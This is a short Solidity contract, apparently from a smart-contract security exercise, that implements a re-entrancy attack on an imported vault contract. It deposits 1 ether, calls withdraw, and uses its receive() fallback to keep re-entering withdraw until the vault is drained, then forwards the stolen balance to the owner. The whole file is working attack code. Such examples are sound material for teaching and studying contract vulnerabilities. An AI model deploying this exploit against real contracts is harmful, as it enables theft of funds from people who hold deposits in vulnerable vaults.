// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import "./Iron.sol";

contract reentry {
    // This contract is a re-entrancy attack example
    vault public v;
    address public owner;
    uint256 public setAmount = 1 ether;
    bool attack = false;

    constructor(address _vault) payable {
        v = vault(payable(_vault));
        owner = msg.sender;
    }

    function enter() external payable {
        require(msg.value == setAmount, "Send 1 ether to attack");
        require(msg.sender == owner, "Only owner can attack");
        v.deposit{value: msg.value}();
        //attack the vault by calling withdraw
        attack = true;
        v.withdraw(setAmount);
    }

    // Fallback function to receive ether and re-enter the vault
    receive() external payable {
        if (attack && address(v).balance >= setAmount) {
            v.withdraw(setAmount);
        } else {
            attack = false;
            (bool success,) = owner.call{value: address(this).balance}("");
            require(success, "ya got fked");
        }
    }
}
